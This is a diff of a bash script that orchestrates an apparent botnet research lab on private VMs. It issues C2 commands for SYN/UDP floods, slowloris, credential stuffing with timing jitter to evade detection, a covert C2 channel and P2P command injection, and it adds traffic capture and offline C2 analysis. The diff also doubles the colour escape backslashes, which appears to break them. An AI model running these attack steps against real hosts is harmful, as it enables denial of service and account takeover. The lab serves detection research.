@@ -8,7 +8,7 @@
 #
 #  Prerequisites on every VM:
 #    sudo apt install -y python3 python3-pip gcc make \
-#         libpcap-dev apache2 libssl-dev
+#         libpcap-dev apache2 libssl-dev tcpdump
 #    pip3 install flask scapy psutil pycryptodome matplotlib cowrie
 #    Compile: gcc -o bot_agent bot_agent.c -lpthread -lssl -lcrypto
 #             gcc -o mirai_scanner mirai_scanner.c -lpthread
@@ -31,8 +31,8 @@
 set -e
 
 # ── Colours ──────────────────────────────────────────────────────
-RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'
-BLU='\033[0;34m'; CYN='\033[0;36m'; NC='\033[0m'
+RED='\\033[0;31m'; GRN='\\033[0;32m'; YLW='\\033[1;33m'
+BLU='\\033[0;34m'; CYN='\\033[0;36m'; NC='\\033[0m'
 
 # ── IPs ──────────────────────────────────────────────────────────
 C2_IP="192.168.100.10"
@@ -50,7 +50,6 @@ fail() { echo -e "${RED}[FAIL]${NC} $*"; }
 
 bot_ssh() {
     # Usage: bot_ssh <ip> <command>
-    # Uses sshpass if available, otherwise falls back to ssh (may require keys)
     local ip="$1"; shift
     if command -v sshpass &>/dev/null; then
         sshpass -p "$SSH_PASS" ssh $SSH_OPTS "vboxuser@$ip" "$@" 2>/dev/null
@@ -69,7 +68,6 @@ bot_ssh_bg() {
 }
 
 c2_curl() {
-    # Usage: c2_curl <json_body>
     curl -s -X POST "http://${C2_IP}:5000/task" \
          -H "Content-Type: application/json" \
          -H "X-Auth-Token: aw" \
@@ -146,10 +144,6 @@ start_fake_portal() {
 
 start_ids() {
     log "Starting IDS on victim VM ($VICTIM_IP)..."
-    # ids_detector.py writes alerts directly to /tmp/ids.log via its own
-    # _open_log_file() handler (opened at startup, line-buffered).
-    # Redirecting stdout to the same path would double every alert line,
-    # inflating collect_graph23_data.py --graph3 TPR measurements by 2x.
     bot_ssh_bg "$VICTIM_IP" "sudo pkill -f ids_detector.py; cd ~/lab && sudo nohup python3 ids_detector.py > /dev/null 2>&1"
     sleep 3
     ok "IDS started"
@@ -168,9 +162,40 @@ start_bots_phase1() {
     bot_ssh_bg "$BOT1_IP" "cd ~/lab && sudo ./bot_agent > /tmp/bot1.log 2>&1"
     bot_ssh_bg "$BOT2_IP" "cd ~/lab && sudo ./bot_agent > /tmp/bot2.log 2>&1"
     sleep 5
-    # Verify bots registered
     BOTS=$(curl -s "http://${C2_IP}:5000/bots" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d))" 2>/dev/null || echo "?")
     ok "Bots registered with C2: $BOTS"
+}
+
+# ────────────────────────────────────────────────────────────────
+# TRAFFIC CAPTURE (NEW)
+# Start a tcpdump on the victim VM at the beginning of Phase 1 so
+# the resulting pcap can be fed into c2_analyzer.py at the end of
+# the run.  The capture runs for the full duration of the attack
+# scenarios and is stopped in run_c2_analysis().
+# ────────────────────────────────────────────────────────────────
+
+TCPDUMP_PID_FILE="/tmp/lab_tcpdump.pid"
+LAB_PCAP_REMOTE="/tmp/lab_capture.pcap"
+LAB_PCAP_LOCAL="/tmp/lab_capture.pcap"
+
+start_traffic_capture() {
+    log "Starting tcpdump on victim VM to capture lab traffic for c2_analyzer..."
+    # Kill any prior capture, start fresh
+    bot_ssh "$VICTIM_IP" "sudo pkill -f 'tcpdump.*lab_capture' 2>/dev/null; true"
+    bot_ssh_bg "$VICTIM_IP" \
+        "sudo tcpdump -i enp0s3 -w $LAB_PCAP_REMOTE \
+         'not (host 192.168.100.1 and port 22)' \
+         > /tmp/tcpdump.log 2>&1 & echo \$! > $TCPDUMP_PID_FILE"
+    sleep 2
+    ok "tcpdump capture started on victim VM → $LAB_PCAP_REMOTE"
+}
+
+stop_traffic_capture() {
+    log "Stopping tcpdump on victim VM..."
+    bot_ssh "$VICTIM_IP" \
+        "PID=\$(cat $TCPDUMP_PID_FILE 2>/dev/null); [ -n \"\$PID\" ] && sudo kill \"\$PID\" 2>/dev/null; true"
+    sleep 3   # let tcpdump flush and close the file
+    ok "tcpdump capture stopped"
 }
 
 # ────────────────────────────────────────────────────────────────
@@ -234,18 +259,14 @@ run_cryptojack() {
 
 run_cred_stuffing() {
     scenario_pause "ATTACK 5/7: Credential Stuffing"
-    # Run from bot1 VM so login attempts arrive from 192.168.100.11,
-    # matching the real threat model (C2 VM should not make login attempts).
     log "Running credential stuffing from bot1 — bot mode (rigid timing, easily detected)..."
     bot_ssh_bg "$BOT1_IP" "cd ~/lab && python3 cred_stuffing.py \
         --mode bot --host $VICTIM_IP --port 80 --interval 300 --jitter 0"
-    CS_BG=1
     sleep 15
     log "Running credential stuffing from bot1 — jitter mode (CV evasion test)..."
     bot_ssh_bg "$BOT1_IP" "cd ~/lab && python3 cred_stuffing.py \
         --mode jitter --host $VICTIM_IP --port 80 --interval 500 --jitter 300"
     sleep 20
-    # Terminate any lingering cred_stuffing processes on bot1
     bot_ssh "$BOT1_IP" "sudo pkill -f cred_stuffing.py" 2>/dev/null || true
     ok "Credential stuffing complete"
 }
@@ -290,9 +311,7 @@ run_phase2_covert() {
     bot_ssh_bg "$BOT1_IP" "cd ~/lab && python3 covert_bot.py > /tmp/covert_bot.log 2>&1"
     sleep 5
     log "Wireshark capture note: bot traffic appears as HTTPS GET to 192.168.100.10:5001"
-    log "  - Port 443 would be indistinguishable from github.com traffic"
-    log "  - JA3 fingerprint: Chrome 120 mimic"
-    sleep 70   # wait for bot poll cycle (default 60s ± jitter)
+    sleep 70
     log "Phase 2 covert bot log (from bot1):"
     bot_ssh "$BOT1_IP" "tail -15 /tmp/covert_bot.log" 2>/dev/null || true
     ok "Phase 2 covert channel demonstration complete"
@@ -324,7 +343,7 @@ run_phase3_p2p() {
     ./kademlia_p2p --host "$C2_IP" --port 7401 \
         --bootstrap "$C2_IP:7400" \
         --inject "{\"type\":\"syn_flood\",\"target\":\"$VICTIM_IP\",\"port\":80,\"duration\":10}"
-    sleep 35   # wait for bots to poll and execute
+    sleep 35
 
     log "Resilience demonstration: killing seed node..."
     kill $P2P_SEED_PID 2>/dev/null || true
@@ -347,15 +366,11 @@ run_dpi_measurement() {
     log "Setting up iptables egress filtering..."
     sudo python3 firewall_dpi.py --setup || true
     sleep 2
-    # --duration 120 matches generate_graphs.py WINDOW = 120.0
-    # Using 60 s here would make all DPI detection rates appear ~2x higher
-    # than they really are because the TTD-to-rate formula divides by 120.
     log "Running DPI engine for 120s to collect TTD data..."
     python3 firewall_dpi.py --measure --duration 120 &
     DPI_PID=$!
-    # Simultaneously run an attack so DPI has traffic to analyse
     c2_curl "{\"bot_id\":\"all\",\"type\":\"syn_flood\",\"target_ip\":\"$VICTIM_IP\",\"duration\":15}"
-    sleep 125   # 120 s measurement + 5 s teardown buffer
+    sleep 125
     kill $DPI_PID 2>/dev/null || true
     python3 firewall_dpi.py --teardown || true
     ok "DPI measurement complete — see graph1_measured_data.json"
@@ -400,10 +415,99 @@ generate_graphs.graph3_ids_accuracy('/tmp/botnet_graphs/graph3_ids_accuracy.png'
 print('Graphs saved to /tmp/botnet_graphs/')
 " 2>/dev/null || python3 generate_graphs.py
     ok "All 3 research graphs generated in /tmp/botnet_graphs/"
-    # Real measurement files (graph1/2/3_measured_data.json) are auto-loaded
-    # by generate_graphs.py when present; graphs are annotated [REAL DATA].
-    # Check what is still missing before final submission:
     python3 generate_graphs.py --status 2>/dev/null || true
+}
+
+# ────────────────────────────────────────────────────────────────
+# OFFLINE C2 ANALYSIS (NEW)
+# After all attacks complete, fetch the pcap captured on the victim
+# VM and run c2_analyzer.py against it.  This connects the attack
+# simulation pipeline to the offline C2 detection pipeline that was
+# previously a standalone tool with no integration point.
+# ────────────────────────────────────────────────────────────────
+
+run_c2_analysis() {
+    scenario_pause "OFFLINE C2 ANALYSIS: c2_analyzer.py on captured traffic"
+
+    # ── 1. Stop traffic capture and retrieve the pcap ─────────────
+    stop_traffic_capture
+
+    log "Copying captured pcap from victim VM → $LAB_PCAP_LOCAL ..."
+    if command -v sshpass &>/dev/null; then
+        sshpass -p "$SSH_PASS" scp $SSH_OPTS \
+            "vboxuser@$VICTIM_IP:$LAB_PCAP_REMOTE" \
+            "$LAB_PCAP_LOCAL" 2>/dev/null || {
+            warn "Could not copy pcap from victim VM — skipping c2_analyzer"
+            return 1
+        }
+    else
+        scp $SSH_OPTS "vboxuser@$VICTIM_IP:$LAB_PCAP_REMOTE" \
+            "$LAB_PCAP_LOCAL" 2>/dev/null || {
+            warn "Could not copy pcap (no sshpass, no keys) — skipping c2_analyzer"
+            return 1
+        }
+    fi
+
+    PCAP_SIZE=$(stat -c%s "$LAB_PCAP_LOCAL" 2>/dev/null || echo 0)
+    if [ "$PCAP_SIZE" -lt 1024 ]; then
+        warn "Pcap too small (${PCAP_SIZE} bytes) — traffic may not have been captured"
+        return 1
+    fi
+    ok "Pcap retrieved: $LAB_PCAP_LOCAL ($(( PCAP_SIZE / 1024 )) KB)"
+
+    # ── 2. Check IOC cache staleness ──────────────────────────────
+    log "Checking IOC cache freshness before analysis..."
+    python3 c2_analyzer.py --cache-status 2>/dev/null || true
+
+    # ── 3. Run offline C2 analysis ────────────────────────────────
+    log "Running c2_analyzer.py on captured lab traffic..."
+    log "  Flags: --dga (DGA detection) --threat-feed (C2 feed lookup)"
+    log "  Output directory: /tmp/c2_analysis/"
+    mkdir -p /tmp/c2_analysis
+
+    python3 c2_analyzer.py \
+        -i "$LAB_PCAP_LOCAL" \
+        -o /tmp/c2_analysis \
+        -s \
+        -w \
+        --dga \
+        --threat-feed \
+        --quiet \
+        2>/dev/null || {
+        warn "c2_analyzer.py encountered errors — check /tmp/c2_analysis/ for partial output"
+        return 1
+    }
+
+    ok "Offline C2 analysis complete"
+    log "Output files:"
+    log "  /tmp/c2_analysis/detected_iocs.json      — all detection findings"
+    log "  /tmp/c2_analysis/extracted_data.json     — IOCs extracted from pcap"
+    log "  /tmp/c2_analysis/c2_analysis_report.html — HTML report"
+
+    # ── 4. Quick summary of what was detected ─────────────────────
+    if [ -f /tmp/c2_analysis/detected_iocs.json ]; then
+        log "Detection summary:"
+        python3 - <<'PYEOF'
+import json, sys
+try:
+    with open("/tmp/c2_analysis/detected_iocs.json") as f:
+        d = json.load(f)
+    keys = [k for k in d if k not in (
+        "filepath","analysis_timestamp","thresholds",
+        "aggregated_ip_addresses","aggregated_domain_names","aggregated_urls"
+    ) and d[k]]
+    if keys:
+        print(f"  Detections fired ({len(keys)}): {', '.join(keys)}")
+    else:
+        print("  No C2 indicators detected in captured traffic")
+    agg_ips = d.get("aggregated_ip_addresses", [])
+    if agg_ips:
+        print(f"  Aggregated public IPs: {', '.join(agg_ips[:5])}"
+              + (f" … +{len(agg_ips)-5} more" if len(agg_ips) > 5 else ""))
+except Exception as e:
+    print(f"  (could not parse output: {e})")
+PYEOF
+    fi
 }
 
 # ────────────────────────────────────────────────────────────────
@@ -422,10 +526,8 @@ cleanup_all() {
     pkill -f slowloris.py   2>/dev/null || true
     bot_ssh_bg "$BOT1_IP" "sudo pkill -f bot_agent; sudo pkill -f mirai_scanner; sudo pkill -f kademlia_p2p; sudo pkill -f covert_bot"
     bot_ssh_bg "$BOT2_IP" "sudo pkill -f bot_agent; sudo pkill -f kademlia_p2p"
-    bot_ssh_bg "$VICTIM_IP" "sudo pkill -f ids_detector; sudo pkill -f fake_portal; cowrie stop"
-    # Clear tarpit state so stale flags don't bleed into the next session
+    bot_ssh_bg "$VICTIM_IP" "sudo pkill -f ids_detector; sudo pkill -f fake_portal; cowrie stop; sudo pkill -f tcpdump 2>/dev/null"
     bot_ssh "$VICTIM_IP" "cd ~/lab && python3 tarpit_state.py clear" 2>/dev/null || true
-    # Remove iptables rules if they were applied
     sudo python3 firewall_dpi.py --teardown 2>/dev/null || true
     sleep 2
     ok "Cleanup complete"
@@ -465,6 +567,7 @@ case "$PHASE" in
         start_ids
         start_cowrie
         start_bots_phase1
+        start_traffic_capture        # NEW: begin pcap capture
         run_syn_flood
         run_udp_flood
         run_slowloris
@@ -475,6 +578,7 @@ case "$PHASE" in
         run_dpi_measurement
         run_cowrie_analysis
         generate_all_graphs
+        run_c2_analysis              # NEW: offline analysis on captured traffic
         ;;
     2|"phase2")
         log "Running Phase 2 only (Covert channel)"
@@ -498,6 +602,7 @@ case "$PHASE" in
         start_ids
         start_cowrie
         start_bots_phase1
+        start_traffic_capture        # NEW: begin pcap capture for c2_analyzer
         run_syn_flood
         run_udp_flood
         run_slowloris
@@ -520,17 +625,24 @@ case "$PHASE" in
         # ── Research graphs ────────────────────────────────────
         generate_all_graphs
 
+        # ── Offline C2 analysis on captured traffic (NEW) ──────
+        run_c2_analysis
+
         echo ""
         echo -e "${GRN}╔══════════════════════════════════════════════════════╗${NC}"
         echo -e "${GRN}║   FULL LAB COMPLETE                                  ║${NC}"
         echo -e "${GRN}║                                                      ║${NC}"
         echo -e "${GRN}║   Outputs:                                           ║${NC}"
-        echo -e "${GRN}║     Graphs:    /tmp/botnet_graphs/*.png              ║${NC}"
-        echo -e "${GRN}║     IR report: /tmp/incident_report.md               ║${NC}"
-        echo -e "${GRN}║     DPI data:  ./graph1_measured_data.json           ║${NC}"
-        echo -e "${GRN}║     C2 log:    /tmp/c2_server.log                   ║${NC}"
-        echo -e "${GRN}║     IDS log:   /tmp/ids.log (on victim VM)          ║${NC}"
-        echo -e "${GRN}║     Cowrie:    ~/.cowrie/var/log/cowrie/cowrie.json  ║${NC}"
+        echo -e "${GRN}║     Graphs:      /tmp/botnet_graphs/*.png            ║${NC}"
+        echo -e "${GRN}║     IR report:   /tmp/incident_report.md             ║${NC}"
+        echo -e "${GRN}║     DPI data:    ./graph1_measured_data.json         ║${NC}"
+        echo -e "${GRN}║     C2 log:      /tmp/c2_server.log                 ║${NC}"
+        echo -e "${GRN}║     IDS log:     /tmp/ids.log (on victim VM)        ║${NC}"
+        echo -e "${GRN}║     Cowrie:      ~/.cowrie/var/log/cowrie/cowrie.json║${NC}"
+        echo -e "${GRN}║     C2 analysis: /tmp/c2_analysis/ (NEW)            ║${NC}"
+        echo -e "${GRN}║       detected_iocs.json                            ║${NC}"
+        echo -e "${GRN}║       extracted_data.json                           ║${NC}"
+        echo -e "${GRN}║       c2_analysis_report.html                       ║${NC}"
         echo -e "${GRN}║                                                      ║${NC}"
         echo -e "${GRN}║   Real data auto-loaded when JSON files are present  ║${NC}"
         echo -e "${GRN}║   Run: python3 generate_graphs.py --status           ║${NC}"
